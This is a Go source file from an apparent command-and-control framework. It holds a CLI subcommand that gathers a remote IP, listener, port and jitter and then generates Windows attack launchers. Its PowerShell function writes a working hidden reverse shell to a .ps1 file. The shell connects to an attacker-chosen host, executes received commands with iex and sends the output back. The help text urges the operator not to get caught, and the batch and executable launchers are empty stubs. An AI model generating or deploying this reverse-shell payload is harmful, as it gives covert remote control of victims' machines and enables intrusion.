/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"

	"github.com/manifoldco/promptui"
	"github.com/megatop1/MedellinC2/data"
	"github.com/spf13/cobra"
)

// windowsCmd represents the windows command
var windowsCmd = &cobra.Command{
	Use:   "windows",
	Short: "Displays a list of different windows payloads that can be generated",
	Long: `Please select a windows payload that you wish to generate and deploy on
	the target machine. Please choose wisely and do not get caught`,
	Run: func(cmd *cobra.Command, args []string) {
		//fmt.Println("windows called")
		createWindowsPayload()
	},
}

type promptWindowsContent struct {
	remoteIP    string
	listener    string
	listenerIP  string
	remotePort  string
	Jitter      string
	payloadType string
}

func promptGetWindowsInput(pc promptContent) string {
	validate := func(input string) error {
		if len(input) <= 0 {
			return errors.New(pc.errorMsg)
		}
		return nil
	}

	templates := &promptui.PromptTemplates{
		Prompt:  "{{ . }}",
		Valid:   "{{ . | green }}",
		Invalid: "{{ . | red }}",
		Success: "{{ . | bold }}",
	}

	prompt := promptui.Prompt{
		Label:     pc.label,
		Templates: templates,
		Validate:  validate,
	}

	result, err := prompt.Run()
	if err != nil {
		fmt.Printf("Prompt failed %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Input: %s\n", result)
	return result
}

func promptWindowsSelect(pc promptContent) string {
	payloads := []string{"powershell", "batch", "executable"}
	index := -1 //keeps prompt open until user chooses a choice

	var result string
	var err error

	for index < 0 {
		prompt := promptui.SelectWithAdd{
			Label:    pc.label,
			Items:    payloads,
			AddLabel: "Other",
		}
		index, result, err = prompt.Run()
		if index == -1 {
			payloads = append(payloads, result)
		}
	}

	//error handling
	if err != nil {
		fmt.Printf("Prompt failed %v\n", err)
		os.Exit(1)
	}
	//if user input successfully received then print it
	fmt.Printf("Input: %s\n", result)
	return result
}

func createWindowsPayload() {
	payloadNamePromptContent := promptContent{
		"Please enter in the remote IP: ",
		"Remote IP: ",
	}
	remoteIP := promptGetWindowsInput(payloadNamePromptContent)

	//payload type
	windowsPayloadPromptContent := promptContent{
		"Please choose an existing listener type",
		"Listener: ",
	}

	listener := promptGetWindowsInput(windowsPayloadPromptContent)

	definitionListenerIP := promptContent{
		"Please choose a local IP",
		"LHOST: ",
	}

	listenerIP := promptGetWindowsInput(definitionListenerIP)

	definitionRemotePort := promptContent{
		"Please choose a remote port",
		"RPORT: ",
	}

	remotePort := promptGetWindowsInput(definitionRemotePort)

	definitionJitter := promptContent{
		"Please enter a jitter percentage",
		"Please enter desired jitter percentage: %",
	}

	jitter := promptGetWindowsInput(definitionJitter)

	definitionPayloadType := promptContent{
		"Please enter a payload type",
		"Please enter desired payloadtype: ",
	}

	payloadType := promptWindowsSelect(definitionPayloadType)

	data.InsertLauncher(remoteIP, listener, listenerIP, remotePort, remoteIP, jitter)
	//convert to switch statement at some point
	if payloadType != "" {
		if payloadType == "exe" {
			print("generating executable launcher...\n")
		} else if payloadType == "powershell" {
			print("generating powershell launcher...\n")
			powershellLauncher(remoteIP, remotePort)
		} else if payloadType == "batch" {
			print("generating batch (cmd) launcher...\n")
		}
	}

	print("Launcher created\n")
}

/* PowerShell */
func powershellLauncher(listenerIP string, remotePort string) {

	/* Create pspayload.ps1 file and place in inside of the lauchers folder */
	path := filepath.Join("launchers", "pspayload.ps1")
	fmt.Println(path)
	file, err := os.Create(path)
	if err != nil {
		log.Fatal(err)
	}

	/* Generate the code for the file */
	val := `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient`
	val2 := `("` + listenerIP + `",` + remotePort + ");"
	val3 := `$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()`
	data := []byte(val + val2 + val3)

	err2 := ioutil.WriteFile("launchers/"+"pspayload.ps1", data, 0)

	if err != nil {
		log.Fatal(err2)
	}
	fmt.Println("PowerShell Launcher successfully created")
	defer file.Close()
}

/* Executable */

func exeLauncher() {

}

func batchLauncher() {

}

func init() {
	launcherCmd.AddCommand(windowsCmd)
}
